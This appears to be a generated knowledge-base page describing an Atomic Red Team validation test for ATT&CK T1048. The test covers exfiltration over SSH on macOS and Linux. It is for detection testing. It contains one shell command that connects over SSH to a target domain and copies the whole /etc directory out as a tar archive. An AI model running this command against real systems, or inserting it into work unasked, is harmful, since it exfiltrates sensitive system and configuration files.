---
atomic_guid: "f6786cc8-beda-4915-a4d6-ac2f193bb988"
title: "Exfiltration Over Alternative Protocol - SSH"
framework: "atomic"
generated: "true"
attack_technique_id: "T1048"
attack_technique_name: "Exfiltration Over Alternative Protocol"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1048/T1048.yaml"
build_date: "2026-04-27 19:12:26"
executor: "sh"
aliases:
  - "f6786cc8-beda-4915-a4d6-ac2f193bb988"
  - "Exfiltration Over Alternative Protocol - SSH"
platforms:
  - "macos"
  - "linux"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.

## ATT&CK Mapping

- [[kb/attack/techniques/T1048-exfiltration_over_alternative_protocol|T1048: Exfiltration Over Alternative Protocol]]

## Input Arguments

### domain

- description: target SSH domain
- type: url
- default: target.example.com

## Executor

- name: sh

### Command

```bash
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1048/T1048.yaml)
